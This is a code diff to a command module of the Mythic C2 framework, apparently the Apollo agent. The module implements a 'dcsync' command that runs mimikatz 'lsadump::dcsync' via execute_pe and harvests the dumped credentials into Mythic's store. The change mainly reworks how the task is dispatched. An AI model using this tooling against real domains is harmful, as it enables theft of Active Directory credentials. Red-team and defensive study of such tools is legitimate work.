@@ -2,6 +2,7 @@ from mythic_container.MythicCommandBase import *
 from os import path
 from mythic_container.MythicRPC import *
 import mslex
+from .execute_pe import *
 
 
 class DcSyncArguments(TaskArguments):
@@ -69,7 +70,7 @@ async def parse_credentials_dcsync(
         Success=True, TaskStatus="success", Completed=True
     )
     responses = await SendMythicRPCResponseSearch(
-        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
+        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
     )
     for output in responses.Responses:
         mimikatz_out = str(output.Response)
@@ -89,7 +90,7 @@ async def parse_credentials_dcsync(
                     if passwd != "(null)":
                         cred_resp = await MythicRPC().execute(
                             "create_credential",
-                            task_id=task.SubtaskData.Task.ID,
+                            task_id=task.TaskData.Task.ID,
                             credential_type="plaintext",
                             account=uname,
                             realm=realm,
@@ -107,38 +108,37 @@ class DcSyncCommand(CommandBase):
     needs_admin = False
     help_cmd = "dcsync -Domain [domain] -User [user]"
     description = "Sync a user's Kerberos keys to the local machine."
-    version = 3
+    version = 4
     author = "@djhohnstein"
     argument_class = DcSyncArguments
     attackmapping = ["T1003.006"]
-    script_only = True
+    script_only = False
     completion_functions = {"parse_credentials_dcsync": parse_credentials_dcsync}
 
     async def create_go_tasking(
         self, taskData: PTTaskMessageAllData
     ) -> PTTaskCreateTaskingMessageResponse:
-        response = PTTaskCreateTaskingMessageResponse(
-            TaskID=taskData.Task.ID,
-            Success=True,
-        )
 
         arguments = taskData.args.get_arg("arguments")
-        response.DisplayParams = arguments
+
         arguments = "lsadump::dcsync " + arguments
-
-        await SendMythicRPCTaskCreateSubtask(
-            MythicRPCTaskCreateSubtaskMessage(
-                TaskID=taskData.Task.ID,
-                CommandName="execute_pe",
-                Params=json.dumps({
-                    "pe_name": "mimikatz.exe",
-                    "pe_arguments": mslex.quote(arguments, for_cmd = False),
-                }),
-                SubtaskCallbackFunction="parse_credentials_dcsync",
-            )
-        )
-
-        return response
+        executePEArgs = ExecutePEArguments(command_line=json.dumps({
+            "pe_name": "mimikatz.exe",
+            "pe_arguments": mslex.quote(arguments, for_cmd = False),
+        }))
+        await executePEArgs.parse_arguments()
+        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
+                                            agent_code_path=self.agent_code_path,
+                                            agent_browserscript_path=self.agent_browserscript_path)
+        # set our taskData args to be the new ones for execute_pe
+        taskData.args = executePEArgs
+        # executePE's creat_go_tasking function returns a response for us
+        newResp = await executePECommand.create_go_tasking(taskData=taskData)
+        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
+        newResp.CommandName = "execute_pe"
+        newResp.DisplayParams = arguments
+        newResp.CompletionFunctionName = "parse_credentials_dcsync"
+        return newResp
 
     async def process_response(
         self, task: PTTaskMessageAllData, response: any
